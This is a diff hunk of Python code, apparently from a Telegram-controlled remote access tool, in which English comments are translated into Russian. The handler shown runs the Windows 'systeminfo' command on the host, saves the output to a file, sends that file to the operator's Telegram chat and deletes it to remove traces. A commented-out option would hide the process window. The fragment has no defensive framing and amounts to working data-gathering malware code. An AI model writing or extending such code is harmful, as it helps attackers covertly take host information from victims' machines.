@@ -68,14 +68,14 @@ def systeminfo(message):
         #startupinfoo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         result = subprocess.run("systeminfo", capture_output=True, text=True)
         if result.returncode == 0:
-            #Save result in txt
+            #Сохранение в .txt для отправки в тг. 
             output_file = "sysinfo.txt"
             with open(output_file, 'w', encoding='utf-8') as file:
                 file.write(result.stdout)
-            #Send result in TG
+            # Отправить результ в тг
             with open(output_file, 'rb') as file:
                 tg_bOt.send_document(message.chat.id, file)
-            #Deleting tmp file
+            #Удаляет созданный на хосте файл
             os.remove(output_file)
         else:
             tg_bOt.reply_to(message, "Failed to retrieve a systeminfo")
